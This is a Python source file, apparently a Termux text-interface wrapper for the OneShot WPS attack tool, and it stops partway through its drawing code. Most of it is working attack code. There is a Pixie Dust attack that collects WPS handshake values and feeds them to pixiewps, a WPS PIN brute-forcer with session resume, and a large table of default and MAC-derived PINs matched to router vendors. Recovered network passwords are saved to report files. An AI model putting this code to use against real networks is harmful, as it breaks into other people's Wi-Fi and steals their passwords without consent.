#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
OneShot Termux TUI — সম্পূর্ণ CLI-to-GUI কনভার্সন
X11 ছাড়া Termux-এ চলে, curses-based interface
"""
import sys, os, subprocess, tempfile, shutil, re, codecs, socket, pathlib, time
import threading, queue, collections, statistics, csv
from datetime import datetime
from pathlib import Path
from typing import Dict

try: import wcwidth
except: wcwidth = None

# ====================== CORE (original oneshot.py logic, unchanged) ======================

class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, int): self._int_repr = mac; self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(mac)
        else: raise ValueError('MAC must be string or int')
    @property
    def string(self): return self._str_repr
    @string.setter
    def string(self, v): self._str_repr = v; self._int_repr = self._mac2int(v)
    @property
    def integer(self): return self._int_repr
    @integer.setter
    def integer(self, v): self._int_repr = v; self._str_repr = self._int2mac(v)
    def __int__(self): return self.integer
    def __str__(self): return self.string
    def __iadd__(self, o): self.integer += o
    def __isub__(self, o): self.integer -= o
    def __eq__(self, o): return self.integer == o.integer
    def __ne__(self, o): return self.integer != o.integer
    def __lt__(self, o): return self.integer < o.integer
    def __gt__(self, o): return self.integer > o.integer
    @staticmethod
    def _mac2int(m): return int(m.replace(':', ''), 16)
    @staticmethod
    def _int2mac(m):
        m = hex(m).split('x')[-1].upper().zfill(12)
        return ':'.join(m[i:i+2] for i in range(0, 12, 2))
    def __repr__(self): return 'NetworkAddress(string={}, integer={})'.format(self._str_repr, self._int_repr)


class WPSpin:
    def __init__(self):
        self.ALGO_MAC, self.ALGO_EMPTY, self.ALGO_STATIC = 0, 1, 2
        self.algos = {
            'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
            'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
            'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
            'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
            'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
            'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
            'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
            'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda m: ''},
            'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda m: 1234567},
            'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda m: 2017252},
            'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda m: 4626484},
            'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda m: 7622990},
            'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda m: 6232714},
            'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda m: 1086411},
            'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda m: 3195719},
            'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda m: 3043203},
            'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda m: 7141225},
            'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda m: 6817554},
            'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda m: 9566146},
            'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda m: 9571911},
            'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda m: 4856371},
            'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda m: 2085483},
            'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda m: 4397768},
            'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda m: 529417},
            'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda m: 9995604},
            'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda m: 3561153},
            'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda m: 6795814},
            'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda m: 3425928},
            'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda m: 9422988},
            'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda m: 9575521}}

    @staticmethod
    def checksum(pin):
        a = 0
        while pin: a += 3*(pin%10); pin//=10; a += pin%10; pin//=10
        return (10 - a%10) % 10

    def generate(self, algo, mac):
        mac = NetworkAddress(mac)
        if algo not in self.algos: raise ValueError('Invalid algo')
        p = self.algos[algo]['gen'](mac)
        if algo == 'pinEmpty': return p
        p = str(p % 10000000) + str(self.checksum(p % 10000000))
        return p.zfill(8)

    def getAll(self, mac, static=True):
        return [{'id': i, 'name': ('Static \u2014 ' if a['mode']==self.ALGO_STATIC else '')+a['name'],
                 'pin': self.generate(i, mac)}
                for i, a in self.algos.items() if not (a['mode']==self.ALGO_STATIC and not static)]

    def getSuggested(self, mac):
        return [{'id': i, 'name': ('Static \u2014 ' if self.algos[i]['mode']==self.ALGO_STATIC else '')+self.algos[i]['name'],
                 'pin': self.generate(i, mac)}
                for i in self._suggest(mac)]

    def getLikely(self, mac):
        s = self.getSuggested(mac); return s[0]['pin'] if s else None

    def _suggest(self, mac):
        mac = mac.replace(':', '').upper()
        db = {
            'pin24': ('04BF6D','0E5D4E','107BEF','14A9E3','28285D','2A285D','32B2DC','381766','404A03','4E5D4E','5067F0','5CF4AB','6A285D','8E5D4E','AA285D','B0B2DC','C86C87','CC5D4E','CE5D4E','EA285D','E243F6','EC43F6','EE43F6','F2B2DC','FCF528','FEF528','4C9EFF','0014D1','D8EB97','1C7EE5','84C9B2','FC7516','14D64D','9094E4','BCF685','C4A81D','00664B','087A4C','14B968','2008ED','346BD3','4CEDDE','786A89','88E3AB','D46E5C','E8CD2D','EC233D','ECCB30','F49FF3','20CF30','90E6BA','E0CB4E','D4BF7F4','F8C091','001CDF','002275','08863B','00B00C','081075','C83A35','0022F7','001F1F','00265B','68B6CF','788DF7','BC1401','202BC1','308730','5C4CA9','62233D','623CE4','623DFF','6253D4','62559C','626BD3','627D5E','6296BF','62A8E4','62B686','62C06F','62C61F','62C714','62CBA8','62CDBE','62E87B','6416F0','6A1D67','6A233D','6A3DFF','6A53D4','6A559C','6A6BD3','6A96BF','6A7D5E','6AA8E4','6AC06F','6AC61F','6AC714','6ACBA8','6ACDBE','6AD15E','6AD167','721D67','72233D','723CE4','723DFF','7253D4','72559C','726BD3','727D5E','7296BF','72A8E4','72C06F','72C61F','72C714','72CBA8','72CDBE','72D15E','72E87B','0026CE','9897D1','E04136','B246FC','E24136','00E020','5CA39D','D86CE9','DC7144','801F02','E47CF9','000CF6','00A026','A0F3C1','647002','B0487A','F81A67','F8D111','34BA9A','B4944E'),
            'pin28': ('200BC7','4846FB','D46AA8','F84ABF'),
            'pin32': ('000726','D8FEE3','FC8B97','1062EB','1C5F2B','48EE0C','802689','908D78','E8CC18','2CAB25','10BF48','14DAE9','3085A9','50465D','5404A6','C86000','F46D04','3085A9','801F02'),
            'pinDLink': ('14D64D','1C7EE5','28107B','84C9B2','A0AB1B','B8A386','C0A0BB','CCB255','FC7516','0014D1','D8EB97'),
            'pinDLink1': ('0018E7','00195B','001CF0','001E58','002191','0022B0','002401','00265A','14D64D','1C7EE5','340804','5CD998','84C9B2','B8A386','C8BE19','C8D3A3','CCB255','0014D1'),
            'pinASUS': ('049226','04D9F5','08606E','0862669','107B44','10BF48','10C37B','14DDA9','1C872C','1CB72C','2C56DC','2CFDA1','305A3A','382C4A','38D547','40167E','50465D','54A050','6045CB','60A44C','704D7B','74D02B','7824AF','88D7F6','9C5C8E','AC220B','AC9E17','B06EBF','BCEE7B','C860007','D017C2','D850E6','E03F49','F0795978','F832E4','00072624','0008A1D3','00177C','001EA6','00304FB','00E04C0','048D38','081077','081078','081079','083E5D','10FEED3C','181E78','1C4419','2420C7','247F20','2CAB25','3085A98C','3C1E04','40F201','44E9DD','48EE0C','5464D9','54B80A','587BE906','60D1AA21','64517E','64D954','6C198F','6C7220','6CFDB9','78D99FD','7C2664','803F5DF6','84A423','88A6C6','8C10D4','8C882B00','904D4A','907282','90F65290','94FBB2','A01B29','A0F3C1E','A8F7E00','ACA213','B85510','B8EE0E','BC3400','BC9680','C891F9','D00ED90','D084B0','D8FEE3','E4BEED','E894F6F6','EC1A5971','EC4C4D','F42853','F43E61','F46BEF','F8AB05','FC8B97','7062B8','78542E','C0A0BB8C','C412F5','C4A81D','E8CC18','EC2280','F8E903F4'),
            'pinAirocon': ('0007262F','000B2B4A','000EF4E7','001333B','00177C','001AEF','00E04BB3','02101801','0810734','08107710','1013EE0','2CAB25C7','788C54','803F5DF6','94FBB2','BC9680','F43E61','FC8B97'),
            'pinEmpty': ('E46F13','EC2280','58D56E','1062EB','10BEF5','1C5F2B','802689','A0AB1B','74DADA','9CD643','68A0F6','0C96BF','20F3A3','ACE215','C8D15E','000E8F','D42122','3C9872','788102','7894B4','D460E3','E06066','004A77','2C957F','64136C','74A78E','88D274','702E22','74B57E','789682','7C3953','8C68C8','D476EA','344DEA','38D82F','54BE53','709F2D','94A7B7','981333','CAA366','D0608C'),
            'pinCisco': ('001A2B','00248C','002618','344DEB','7071BC','E06995','E0CB4E','7054F5'),
            'pinBrcm1': ('ACF1DF','BCF685','C8D3A3','988B5D','001AA9','14144B','EC6264'),
            'pinBrcm2': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19'),
            'pinBrcm3': ('14D64D','1C7EE5','28107B','B8A386','BCF685','C8BE19','7C034C'),
            'pinBrcm4': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB','18622C','7C03D8','D86CE9'),
            'pinBrcm5': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB','18622C','7C03D8','D86CE9'),
            'pinBrcm6': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB','18622C','7C03D8','D86CE9'),
            'pinAirc1': ('181E78','40F201','44E9DD','D084B0'),
            'pinAirc2': ('84A423','8C10D4','88A6C6'),
            'pinDSL2740R': ('00265A','1CBDB9','340804','5CD998','84C9B2','FC7516'),
            'pinRealtek1': ('0014D1','000C42','000EE8'),
            'pinRealtek2': ('007263','E4BEED'),
            'pinRealtek3': ('08C6B3',),
            'pinUpvel': ('784476','D4BF7F0','F8C091'),
            'pinUR814AC': ('D4BF7F60',),
            'pinUR825AC': ('D4BF7F5',),
            'pinOnlime': ('D4BF7F','F8C091','144D67','784476','0014D1'),
            'pinEdimax': ('801F02','00E04C'),
            'pinThomson': ('002624','4432C8','88F7C7','CC03FA'),
            'pinHG532x': ('00664B','086361','087A4C','0C96BF','14B968','2008ED','2469A5','346BD3','786A89','88E3AB','9CC172','ACE215','D07AB5','CCA223','E8CD2D','F80113','F83DFF'),
            'pinH108L': ('4C09B4','4CAC0A','84742A4','9CD24B','B075D5','C864C7','DC028E','FCC897'),
            'pinONO': ('5C353B','DC537C')
        }
        return [aid for aid, masks in db.items() if mac.startswith(masks)]

    def pin24(self, m): return m.integer & 0xFFFFFF
    def pin28(self, m): return m.integer & 0xFFFFFFF
    def pin32(self, m): return m.integer % 0x100000000
    def pinDLink(self, m):
        n = m.integer & 0xFFFFFF; p = n ^ 0x55AA55
        p ^= (((p&0xF)<<4)+((p&0xF)<<8)+((p&0xF)<<12)+((p&0xF)<<16)+((p&0xF)<<20))
        p %= int(10e6)
        if p < int(10e5): p += ((p%9)*int(10e5))+int(10e5)
        return p
    def pinDLink1(self, m): m.integer += 1; return self.pinDLink(m)
    def pinASUS(self, m):
        b = [int(i,16) for i in m.string.split(':')]
        return int(''.join(str((b[i%6]+b[5])%(10-(i+b[1]+b[2]+b[3]+b[4]+b[5])%7)) for i in range(7)))
    def pinAirocon(self, m):
        b = [int(i,16) for i in m.string.split(':')]
        return ((b[0]+b[1])%10)+(((b[5]+b[0])%10)*10)+(((b[4]+b[5])%10)*100)+(((b[3]+b[4])%10)*1000)+(((b[2]+b[3])%10)*10000)+(((b[1]+b[2])%10)*100000)+(((b[0]+b[1])%10)*1000000)


def get_hex(l): return l.split(':',3)[2].replace(' ','').upper()

class PixiewpsData:
    def __init__(self): self.pke=self.pkr=self.e_hash1=self.e_hash2=self.authkey=self.e_nonce=''
    def clear(self): self.__init__()
    def got_all(self): return all([self.pke,self.pkr,self.e_nonce,self.authkey,self.e_hash1,self.e_hash2])
    def get_pixie_cmd(self, fr=False):
        return "pixiewps --pke {} --pkr {} --e-hash1 {} --e-hash2 {} --authkey {} --e-nonce {}".format(
            self.pke, self.pkr, self.e_hash1, self.e_hash2, self.authkey, self.e_nonce) + (' --force' if fr else '')

class ConnStatus:
    def __init__(self): self.status=''; self.last_m=0; self.essid=''; self.wpa_psk=''
    def isFirstHalfValid(self): return self.last_m > 5
    def clear(self): self.__init__()

class BFStatus:
    def __init__(self):
        self.start=datetime.now().strftime("%Y-%m-%d %H:%M:%S"); self.mask=''
        self.last_t=time.time(); self.times=collections.deque(maxlen=15); self.cnt=0
    def display(self, cb=None):
        avg=statistics.mean(self.times)
        p=int(self.mask)/11000*100 if len(self.mask)==4 else ((10000/11000)+(int(self.mask[4:])/11000))*100
        msg='{:.2f}% @ {} ({:.2f}s/pin)'.format(p,self.start,avg)
        if cb: cb(msg)
    def reg(self, mask, cb=None):
        self.mask=mask; self.cnt+=1; n=time.time()
        self.times.append(n-self.last_t); self.last_t=n
        if self.cnt==5: self.cnt=0; self.display(cb)
    def clear(self): self.__init__()


class Companion:
    def __init__(self, iface, save=False, debug=False, bssid='', cb=None):
        self.iface=iface; self.save=save; self.debug=debug; self.cb=cb; self.abort_f=False
        self.td=tempfile.mkdtemp()
        with tempfile.NamedTemporaryFile(mode='w',suffix='.conf',delete=False) as f:
            f.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.td))
            self.tc=f.name
        self.wpa_ctrl='{}/{}'.format(self.td,iface)
        self._init_wpa()
        self.rsf='{}/{}'.format(tempfile._get_default_tempdir(),next(tempfile._get_candidate_names()))
        self.rs=socket.socket(socket.AF_UNIX,socket.SOCK_DGRAM); self.rs.bind(self.rsf)
        self.px=PixiewpsData(); self.cs=ConnStatus(); self.g=WPSpin()
        uh=str(pathlib.Path.home())
        self.sd='{}/.OneShot/sessions/'.format(uh); self.pd='{}/.OneShot/pixiewps/'.format(uh)
        self.rd=os.path.dirname(os.path.realpath(__file__))+'/reports/'
        for d in [self.sd,self.pd,self.rd]: os.makedirs(d,exist_ok=True)
        self.bssid=bssid; self.lp=0

    def abort(self): self.abort_f=True
    def log(self, m):
        if self.cb: self.cb(m)

    def _init_wpa(self):
        self.log('[*] Starting wpa_supplicant...')
        cmd='wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.iface,self.tc)
        self.wpas=subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,encoding='utf-8',errors='replace')
        while True:
            if self.wpas.poll() is not None and self.wpas.returncode!=0:
                raise ValueError('wpa_supplicant error: '+self.wpas.communicate()[0])
            if os.path.exists(self.wpa_ctrl): break
            time.sleep(.1)

    def send(self,c): self.rs.sendto(c.encode(),self.wpa_ctrl)
    def send_recv(self,c):
        self.rs.sendto(c.encode(),self.wpa_ctrl)
        return self.rs.recvfrom(4096)[0].decode('utf-8',errors='replace')

    def _h(self,pxm=False,pbc=False,v=None,bssid=""):
        if v is None: v=self.debug
        l=self.wpas.stdout.readline()
        if not l: self.wpas.wait(); return False
        l=l.rstrip('\n')
        if v: self.log(l)
        if l.startswith('WPS: '):
            if 'Building Message M' in l:
                n=int(l.split('Building Message M')[1].replace('D',''))
                self.cs.last_m=n; self.log('[*] Sending WPS M{}...'.format(n))
            elif 'Received M' in l:
                n=int(l.split('Received M')[1]); self.cs.last_m=n
                self.log('[*] Received WPS M{}'.format(n))
                if n==5: self.log('[+] First half of PIN valid')
            elif 'Received WSC_NACK' in l: self.cs.status='WSC_NACK'; self.log('[-] Wrong PIN')
            elif 'Enrollee Nonce' in l and 'hexdump' in l: self.px.e_nonce=get_hex(l)
            elif 'DH own Public Key' in l and 'hexdump' in l: self.px.pkr=get_hex(l)
            elif 'DH peer Public Key' in l and 'hexdump' in l: self.px.pke=get_hex(l)
            elif 'AuthKey' in l and 'hexdump' in l: self.px.authkey=get_hex(l)
            elif 'E-Hash1' in l and 'hexdump' in l: self.px.e_hash1=get_hex(l)
            elif 'E-Hash2' in l and 'hexdump' in l: self.px.e_hash2=get_hex(l)
            elif 'Network Key' in l and 'hexdump' in l:
                self.cs.status='GOT_PSK'; self.cs.wpa_psk=bytes.fromhex(get_hex(l)).decode('utf-8',errors='replace')
        elif ': State: ' in l and '-> SCANNING' in l: self.cs.status='scanning'; self.log('[*] Scanning...')
        elif 'WPS-FAIL' in l and self.cs.status!='': self.cs.status='WPS_FAIL'; self.log('[-] WPS-FAIL')
        elif 'Trying to authenticate with' in l:
            self.cs.status='authenticating'
            if "SSID" in l: self.cs.essid=codecs.decode("'".join(l.split("'")[1:-1]),'unicode-escape').encode('latin1').decode('utf-8',errors='replace')
            self.log('[*] Authenticating...')
        elif 'Authentication response' in l: self.log('[*] Authenticated')
        elif 'Trying to associate with' in l:
            self.cs.status='associating'
            if "SSID" in l: self.cs.essid=codecs.decode("'".join(l.split("'")[1:-1]),'unicode-escape').encode('latin1').decode('utf-8',errors='replace')
            self.log('[*] Associating...')
        elif 'Associated with' in l and self.iface in l:
            b=l.split()[-1].upper()
            self.log('[+] Associated with {} (ESSID: {})'.format(b,self.cs.essid) if self.cs.essid else '[+] Associated with {}'.format(b))
        elif 'EAPOL: txStart' in l: self.cs.status='eapol_start'; self.log('[*] EAPOL Start...')
        elif 'EAP entering state IDENTITY' in l: self.log('[*] Identity Request')
        elif 'using real identity' in l: self.log('[*] Identity Response...')
        elif self.bssid in l and 'level=' in l: self.lp=l.split("level=")[1].split(" ")[0]
        elif pbc and 'selected BSS ' in l:
            self.cs.bssid=l.split('selected BSS ')[-1].split()[0].upper()
            self.log('[*] Selected AP: {}'.format(self.cs.bssid))
        elif bssid in l and 'level=' in l:
            s=l.split("level=")[1].split(" ")[0]
            self.log("[i] Signal: {}".format(s))
        return True

    def _pixie(self,sc=False,fr=False):
        self.log('[*] Running Pixiewps...')
        cmd=self.px.get_pixie_cmd(fr)
        if sc: self.log(cmd)
        r=subprocess.run(cmd,shell=True,stdout=subprocess.PIPE,stderr=sys.stdout,encoding='utf-8',errors='replace')
        for l in r.stdout.splitlines():
            self.log(l)
            if '[+]' in l and 'WPS pin' in l:
                p=l.split(':')[-1].strip(); return "''" if p=='<empty>' else p
        return None

    def _save_res(self,b,e,pin,psk):
        fn=self.rd+'stored'; ds=datetime.now().strftime("%d.%m.%Y %H:%M")
        with open(fn+'.txt','a',encoding='utf-8') as f:
            f.write('{}\nBSSID:{}\nESSID:{}\nPIN:{}\nPSK:{}\n\n'.format(ds,b,e,pin,psk))
        h=not os.path.isfile(fn+'.csv')
        with open(fn+'.csv','a',newline='',encoding='utf-8') as f:
            w=csv.writer(f,delimiter=';',quoting=csv.QUOTE_ALL)
            if h: w.writerow(['Date','BSSID','ESSID','WPS PIN','WPA PSK'])
            w.writerow([ds,b,e,pin,psk])
        self.log('[i] Saved to reports/stored.txt')

    def _save_pin(self,b,pin):
        fn='{}{}.run'.format(self.pd,b.replace(':','').upper())
        with open(fn,'w') as f: f.write(pin)
        self.log('[i] PIN saved')

    def _wps_conn(self,bssid=None,pin=None,pxm=False,pbc=False,v=None):
        if v is None: v=self.debug
        self.px.clear(); self.cs.clear(); self.wpas.stdout.read(300)
        if pbc:
            cmd='WPS_PBC {}'.format(bssid) if bssid else 'WPS_PBC'
            self.log('[*] WPS PBC...')
        else:
            cmd='WPS_REG {} {}'.format(bssid,pin); self.log("[*] Trying PIN '{}'...".format(pin))
        r=self.send_recv(cmd)
        if 'OK' not in r: self.cs.status='WPS_FAIL'; self.log('[!] wpa_supplicant error'); return False
        while True:
            if self.abort_f: break
            if not self._h(pxm,pbc,v,bssid.lower()): break
            if self.cs.status in ('WSC_NACK','GOT_PSK','WPS_FAIL'): break
        self.send('WPS_CANCEL'); return False

    def single(self,bssid=None,pin=None,pxm=False,pbc=False,sc=False,fr=False,st=False):
        if self.abort_f: return False
        if not pin:
            if pxm:
                fn='{}{}.run'.format(self.pd,bssid.replace(':','').upper())
                if os.path.exists(fn):
                    with open(fn) as f: pin=f.readline().strip()
                else: pin=self.g.getLikely(bssid) or '12345670'
            elif not pbc:
                sug=self.g.getSuggested(bssid); pin=sug[0]['pin'] if sug else '12345670'
        if pbc: self._wps_conn(bssid,pbc=pbc); bssid=self.cs.bssid; pin='<PBC>'
        elif st:
            try: self._wps_conn(bssid,pin,pxm)
            except: self._save_pin(bssid,pin); return False
        else: self._wps_conn(bssid,pin,pxm)
        if self.cs.status=='GOT_PSK':
            self.log("[+] PIN: '{}'".format(pin)); self.log("[+] PSK: '{}'".format(self.cs.wpa_psk))
            self.log("[+] SSID: '{}'".format(self.cs.essid))
            if self.save: self._save_res(bssid,self.cs.essid,pin,self.cs.wpa_psk)
            fn='{}{}.run'.format(self.pd,bssid.replace(':','').upper())
            try: os.remove(fn)
            except: pass
            return True
        elif pxm:
            if self.px.got_all():
                p=self._pixie(sc,fr)
                return self.single(bssid,p,pxm=False,st=True) if p else False
            self.log('[!] Not enough data for Pixie'); return False
        else:
            if st: self._save_pin(bssid,pin)
            return False

    def _fhalf(self,b,f,delay=None):
        while int(f)<10000:
            if self.abort_f: return False
            t=int(f+'000')
            self.single(b,'{}000{}'.format(f,self.g.checksum(t)))
            if self.cs.isFirstHalfValid(): self.log('[+] First half found'); return f
            if self.cs.status=='WPS_FAIL': self.log('[!] Retrying...'); return self._fhalf(b,f)
            f=str(int(f)+1).zfill(4); self.bf.reg(f,self.cb)
            if delay: time.sleep(delay)
        self.log('[-] First half not found'); return False

    def _shalf(self,b,f,s,delay=None):
        while int(s)<1000:
            if self.abort_f: return False
            t=int(f+s); pin='{}{}{}'.format(f,s,self.g.checksum(t))
            self.single(b,pin)
            if self.cs.last_m>6: return pin
            if self.cs.status=='WPS_FAIL': self.log('[!] Retrying...'); return self._shalf(b,f,s)
            s=str(int(s)+1).zfill(3); self.bf.reg(f+s,self.cb)
            if delay: time.sleep(delay)
        return False

    def bf(self,b,start=None,delay=None):
        if (not start) or len(start)<4:
            fn='{}{}.run'.format(self.sd,b.replace(':','').upper())
            m='0000' if not os.path.exists(fn) else open(fn).readline().strip()
        else: m=start[:7]
        try:
            self.bf=BFStatus(); self.bf.mask=m
            if len(m)==4:
                fh=self._fhalf(b,m,delay)
                if fh and self.cs.status!='GOT_PSK': self._shalf(b,fh,'001',delay)
            elif len(m)==7: self._shalf(b,m[:4],m[4:],delay)
        except:
            with open('{}{}.run'.format(self.sd,b.replace(':','').upper()),'w') as f: f.write(self.bf.mask)
            self.log('[i] Session saved')

    def cleanup(self):
        for n in ['rs','wpas','rsf','td']:
            try:
                o=getattr(self,n,None)
                if n=='rs' and o: o.close()
                elif n=='wpas' and o: o.terminate()
                elif n=='rsf' and o: os.remove(o)
                elif n=='td' and o: shutil.rmtree(o,ignore_errors=True)
            except: pass
        try: os.remove(self.tc)
        except: pass
    def __del__(self): self.cleanup()


def iface_up(iface, down=False):
    return subprocess.run('ip link set {} {}'.format(iface,'down' if down else 'up'),shell=True).returncode==0

def load_vuln_list():
    try:
        with open(os.path.dirname(os.path.realpath(__file__))+'/vulnwsc.txt', encoding='utf-8') as f:
            return f.read().splitlines()
    except: return []

class WiFiScanner:
    def __init__(self, interface, vuln_list=None):
        self.interface = interface; self.vuln_list = vuln_list or []
        rf = os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.csv'
        self.stored = []
        try:
            with open(rf, newline='', encoding='utf-8', errors='replace') as f:
                r = csv.reader(f, delimiter=';', quoting=csv.QUOTE_ALL)
                next(r); self.stored = [(row[1], row[2]) for row in r]
        except: pass
    def iw_scanner(self):
        def hn(l,r,nets): nets.append({'Security type':'Unknown','WPS':False,'WPS locked':False,'Model':'','Model number':'','Device name':''}); nets[-1]['BSSID']=r.group(1).upper()
        def he(l,r,nets): nets[-1]['ESSID']=codecs.decode(r.group(1),'unicode-escape').encode('latin1').decode('utf-8',errors='replace')
        def hl(l,r,nets): nets[-1]['Level']=int(float(r.group(1)))
        def hs(l,r,nets):
            s=nets[-1]['Security type']
            if r.group(1)=='capability': s='WEP' if 'Privacy' in r.group(2) else 'Open'
            elif s=='WEP': s='WPA2' if r.group(1)=='RSN' else 'WPA' if r.group(1)=='WPA' else s
            elif s=='WPA': s='WPA/WPA2' if r.group(1)=='RSN' else s
            elif s=='WPA2': s='WPA/WPA2' if r.group(1)=='WPA' else s
            nets[-1]['Security type']=s
        def hw(l,r,nets): nets[-1]['WPS']=r.group(1)
        def hwl(l,r,nets):
            if int(r.group(1),16): nets[-1]['WPS locked']=True
        def hm(l,r,nets): nets[-1]['Model']=codecs.decode(r.group(1),'unicode-escape').encode('latin1').decode('utf-8',errors='replace')
        def hmn(l,r,nets): nets[-1]['Model number']=codecs.decode(r.group(1),'unicode-escape').encode('latin1').decode('utf-8',errors='replace')
        def hd(l,r,nets): nets[-1]['Device name']=codecs.decode(r.group(1),'unicode-escape').encode('latin1').decode('utf-8',errors='replace')
        r=subprocess.run('iw dev {} scan'.format(self.interface),shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,encoding='utf-8',errors='replace')
        lines=r.stdout.splitlines(); networks=[]
        matchers={re.compile(r'BSS (\S+)( )?\(on \w+\)'):hn,re.compile(r'SSID: (.*)'):he,re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'):hl,re.compile(r'(capability): (.+)'):hs,re.compile(r'(RSN):\t [*] Version: (\d+)'):hs,re.compile(r'(WPA):\t [*] Version: (\d+)'):hs,re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'):hw,re.compile(r' [*] AP setup locked: (0x[0-9]+)'):hwl,re.compile(r' [*] Model: (.*)'):hm,re.compile(r' [*] Model Number: (.*)'):hmn,re.compile(r' [*] Device name: (.*)'):hd}
        for line in lines:
            if line.startswith('command failed:'): return False
            line=line.strip('\t')
            for rp,h in matchers.items():
                m=re.match(rp,line)
                if m: h(line,m,networks)
        networks=[n for n in networks if n.get('WPS')]
        if not networks: return False
        networks.sort(key=lambda x: x.get('Level',0), reverse=True)
        return {(i+1):net for i,net in enumerate(networks)}


# ====================== TERMUX TUI — FULL GUI ======================

import curses

class OneShotTUI:
    CLI_TO_GUI = {
        '-i --interface': 'Interface field',
        '-b --bssid': 'BSSID field',
        '-p --pin': 'PIN field',
        '-K --pixie-dust': 'Attack Mode [1]',
        '-B --bruteforce': 'Attack Mode [2]',
        '--pbc --push-button-connect': 'Attack Mode [3]',
        '-d --delay': 'Delay option',
        '-w --write': 'Save Results toggle',
        '-F --pixie-force': 'Pixie Force toggle',
        '-X --show-pixie-cmd': 'Show Cmd toggle',
        '--vuln-list': 'Load custom vuln list',
        '--iface-down': 'Iface Down toggle',
        '-l --loop': 'Loop toggle',
        '-r --reverse-scan': 'Reverse Scan toggle',
        '--mtk-wifi': 'MTK WiFi toggle',
        '-v --verbose': 'Verbose toggle',
    }

    def __init__(self, stdscr):
        self.stdscr = stdscr
        curses.curs_set(1)
        curses.use_default_colors()
        curses.init_pair(1, curses.COLOR_CYAN, -1)
        curses.init_pair(2, curses.COLOR_GREEN, -1)
        curses.init_pair(3, curses.COLOR_RED, -1)
        curses.init_pair(4, curses.COLOR_YELLOW, -1)
        curses.init_pair(5, curses.COLOR_MAGENTA, -1)
        curses.init_pair(6, curses.COLOR_BLUE, -1)
        curses.init_pair(7, curses.COLOR_WHITE, curses.COLOR_BLUE)

        self.h, self.w = stdscr.getmaxyx()
        self.running = False
        self.companion = None
        self.worker = None
        self.vuln_list = load_vuln_list()
        self.custom_vuln_file = ''
        self.generator = WPSpin()

        # === CLI-to-GUI state ===
        self.iface = 'wlan0'               # -i
        self.bssid = ''                     # -b
        self.pin = ''                       # -p
        self.mode = 'pixie'                 # -K / -B / --pbc
        self.delay = '0'                    # -d
        self.save_res = False               # -w
        self.pixie_force = False            # -F
        self.show_cmd = False               # -X
        self.iface_down = False             # --iface-down
        self.loop = False                   # -l
        self.reverse = False                # -r
        self.mtk = False                    # --mtk-wifi
        self.verbose = False                # -v
        self.networks = {}
        self.log_msgs = []
        self.log_lock = threading.Lock()
        self._scan_result = None
        self.stdscr.nodelay(True)

    def log(self, msg):
        with self.log_lock:
            self.log_msgs.append(msg)
            if len(self.log_msgs) > 500: self.log_msgs = self.log_msgs[-500:]

    # ==================== DRAWING ====================

    def _draw_border_box(self, y, x, h, w, title=''):
        for i in range(h):
            self.stdscr.addch(y+i, x, '|')
